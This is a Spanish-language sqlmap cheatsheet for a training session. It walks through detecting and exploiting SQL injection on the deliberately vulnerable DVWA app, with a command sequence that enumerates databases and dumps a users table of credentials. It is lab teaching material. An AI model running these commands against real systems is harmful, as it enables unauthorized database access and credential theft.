# 💉 sqlmap Cheatsheet — Sesión 4

Automatización de detección y explotación de SQL Injection sobre DVWA.

---

## 🔹 Comando base

```bash
sqlmap -u "http://<IP-DVWA>/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<tu_cookie>; security=low"
```

> 💡 El cookie es necesario porque DVWA requiere sesión iniciada. Obtén tu `PHPSESSID` desde Burp Suite (pestaña Proxy → HTTP History).

## 🔹 Flags más usadas

| Flag | Qué hace |
|---|---|
| `-u` | URL objetivo con el parámetro vulnerable |
| `--cookie` | Cookie de sesión (necesaria si la app requiere login) |
| `--dbs` | Lista las bases de datos disponibles |
| `-D <db>` `--tables` | Lista las tablas de una base de datos específica |
| `-D <db> -T <tabla> --columns` | Lista las columnas de una tabla |
| `-D <db> -T <tabla> --dump` | Extrae los datos de la tabla |
| `--batch` | Responde automáticamente con la opción por defecto (no pide confirmación) |
| `--risk=3 --level=5` | Aumenta la profundidad y agresividad de las pruebas |

## 🧪 Flujo completo de ejemplo

```bash
# 1. Confirmar que el parámetro es inyectable
sqlmap -u "http://<IP>/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="..." --batch

# 2. Listar bases de datos
sqlmap -u "http://<IP>/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="..." --dbs

# 3. Listar tablas de la base "dvwa"
sqlmap -u "http://<IP>/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="..." -D dvwa --tables

# 4. Extraer datos de la tabla "users"
sqlmap -u "http://<IP>/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="..." -D dvwa -T users --dump
```

---

## ✅ Checklist de esta fase

- [ ] Confirmé la inyección con sqlmap (`--batch`)
- [ ] Listé las bases de datos disponibles
- [ ] Extraje al menos una tabla con datos sensibles (ej. usuarios/contraseñas)
- [ ] Documenté el comando exacto usado como evidencia en el reporte
